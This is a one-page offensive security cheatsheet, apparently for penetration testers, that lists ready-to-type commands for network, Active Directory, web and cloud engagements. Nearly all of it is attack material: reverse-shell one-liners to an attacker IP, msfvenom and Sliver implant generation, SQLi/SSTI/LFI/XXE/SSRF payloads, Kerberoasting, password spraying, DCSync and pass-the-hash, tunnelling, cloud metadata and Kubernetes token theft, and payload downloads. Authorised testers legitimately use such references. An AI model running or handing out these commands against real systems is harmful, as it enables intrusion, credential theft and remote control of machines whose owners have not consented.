# Master Cheatsheet

The single-page, most-used command set for a network/AD/web/cloud engagement. Optimized
for "I'm in the box, what do I type next." Pair with `security-tools-reference.md` for
the full categorized catalog. Placeholders: `<T>` target, `<A>` attacker IP, `<D>`
domain, `<DC>` domain controller.

---

## 1. Recon (first 10 minutes)

```bash
# Quick + full nmap (run both; full in background)
nmap -sC -sV -T4 -oA quick <T>
nmap -p- -T4 -oA full <T>                       # then -sCV the open ports
sudo nmap -sU --top-ports 50 <T>                # UDP

# External surface
subfinder -d <D> -all -silent | dnsx -silent | httpx -silent -title -tech-detect -sc -o live.txt
nuclei -l live.txt -severity critical,high

# Web content
ffuf -u http://<T>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .php,.txt,.html -mc all -fc 404
feroxbuster -u http://<T> -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

---

## 2. Service-specific enumeration

```bash
# SMB
nxc smb <T> -u '' -p '' --shares                # null session
nxc smb <CIDR> -u u -p p --shares --users --groups
smbclient -L //<T>/ -N ; smbclient //<T>/share -N

# LDAP / AD
nxc ldap <DC> -u u -p p --bloodhound -c All --dns-server <DC>
enum4linux-ng -A <DC>
ldapsearch -x -H ldap://<DC> -b "dc=corp,dc=local"

# Web fingerprint / WordPress
whatweb <T> ; wpscan --url http://<T> --enumerate u,vp

# DNS zone transfer
dig axfr @<DC> <D>
```

---

## 3. Web exploitation quick hits

```bash
sqlmap -u "http://<T>/p?id=1" --batch --level=3 --risk=2 --dump
# SSTI test: {{7*7}} ${7*7} <%= 7*7 %> #{7*7}
# LFI test:  ?file=../../../../etc/passwd  ?file=php://filter/convert.base64-encode/resource=index
# XXE:       <!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
curl -s "http://<T>/?url=http://169.254.169.254/latest/meta-data/"   # SSRF→cloud
```

---

## 4. Initial access shells

```bash
# Payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<A> LPORT=443 -f exe -o s.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<A> LPORT=443 -f elf -o s.elf

# Reverse shell one-liners
bash -i >& /dev/tcp/<A>/443 0>&1
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("<A>",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

# Listener + upgrade
rlwrap nc -lvnp 443
# then: python3 -c 'import pty;pty.spawn("/bin/bash")';  Ctrl-Z; stty raw -echo; fg; export TERM=xterm
```

---

## 5. Local privilege escalation

```bash
# Linux
./linpeas.sh ; sudo -l ; id ; getcap -r / 2>/dev/null ; find / -perm -4000 -type f 2>/dev/null
crontab -l ; cat /etc/crontab ; ps aux --forest
# Check GTFOBins for any sudo/SUID binary you find.

# Windows
winpeas.exe ; whoami /priv ; whoami /all
# SeImpersonate -> PrintSpoofer/GodPotato ; unquoted service paths ; AlwaysInstallElevated
```

---

## 6. AD attack flow

```bash
# Foothold creds → BloodHound
bloodhound-python -u u -p p -d <D> -dc <DC> -c All -ns <DC>

# Roasting
impacket-GetNPUsers '<D>/' -usersfile u.txt -no-pass -dc-ip <DC>          # AS-REP (18200)
impacket-GetUserSPNs '<D>/u:p' -dc-ip <DC> -request                        # Kerberoast (13100)

# Spray (no lockout via Kerberos)
kerbrute passwordspray -d <D> --dc <DC> u.txt 'Season2026!'

# AD CS
certipy find -u u@<D> -p p -dc-ip <DC> -vulnerable -stdout

# Move + dump
nxc smb <CIDR> -u u -H <HASH> -x whoami
impacket-secretsdump '<D>/u:p@<DC>' -just-dc-ntlm                          # DCSync
evil-winrm -i <T> -u Administrator -H <HASH>
```

```text
Crack: hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule   (Kerberoast)
       hashcat -m 18200 asrep.txt rockyou.txt                (AS-REP)
       hashcat -m 1000  ntlm.txt rockyou.txt                 (NTLM)
```

---

## 7. Pivoting

```bash
# Ligolo-ng (preferred)
# attacker: ./proxy -selfcert      target: ./agent -connect <A>:11601
sudo ip route add 10.10.0.0/24 dev ligolo     # after 'start' in proxy console

# chisel reverse SOCKS
chisel server -p 8080 --reverse               # attacker
chisel client <A>:8080 R:socks                # target
proxychains nxc smb 10.10.0.0/24

# SSH dynamic SOCKS / local forward
ssh -D 1080 user@<JUMP> ; ssh -L 8080:<INTERNAL>:80 user@<JUMP>
```

---

## 8. C2 quick start (Sliver)

```bash
sliver
> generate --mtls <A>:443 --os windows --save /tmp/imp.exe
> mtls --lport 443
> sessions ; use <ID> ; shell ; socks5 start
```

---

## 9. Cloud foothold triage

```bash
# AWS
aws sts get-caller-identity
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/    # SSRF→creds (IMDSv1)
cloudfox aws --profile loot all-checks ; pacu  # run iam__privesc_scan

# Azure (from a VM)
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
roadrecon gather ; azurehound -r <RT> --tenant <id> list

# GCP (from a VM)
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
gcloud projects get-iam-policy <PROJECT>

# Kubernetes (in a pod)
cat /var/run/secrets/kubernetes.io/serviceaccount/token ; kubectl auth can-i --list

# Container escape triage
amicontained ; capsh --print ; ls -la /var/run/docker.sock ; mount | grep host
```

---

## 10. File transfer

```bash
python3 -m http.server 80                                  # serve
impacket-smbserver share . -smb2support                    # SMB serve
wget http://<A>/f -O /tmp/f                                 # linux pull
certutil -urlcache -f http://<A>/f C:\t\f                   # windows pull
powershell iwr http://<A>/f -OutFile C:\t\f
```

---

## 11. Hash modes (hashcat -m) quick lookup

| Mode | Hash | Mode | Hash |
|------|------|------|------|
| 0 | MD5 | 1000 | NTLM |
| 100 | SHA1 | 1800 | sha512crypt ($6$) |
| 500 | md5crypt ($1$) | 3200 | bcrypt ($2*$) |
| 1500 | descrypt | 5600 | NetNTLMv2 |
| 13100 | Kerberoast (TGS) | 18200 | AS-REP |
| 22000 | WPA-PMKID/EAPOL | 7500 | Kerberos AS-REQ |

---

## 12. Listener/port quick reference

| Port | Common use |
|------|-----------|
| 80/443 | HTTP file serve / C2 (blends in) |
| 445 | SMB serve (impacket) |
| 4444 | msf default (avoid; use 443) |
| 1080 | SOCKS proxy |
| 11601 | Ligolo-ng |

---

## References

- HackTricks methodology: https://book.hacktricks.wiki/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- GTFOBins: https://gtfobins.github.io/ — LOLBAS: https://lolbas-project.github.io/
- revshells.com (reverse-shell generator): https://www.revshells.com/
- hashcat example hashes: https://hashcat.net/wiki/doku.php?id=example_hashes
- See `security-tools-reference.md` (this dir) and `11-cloud-security/` guides.
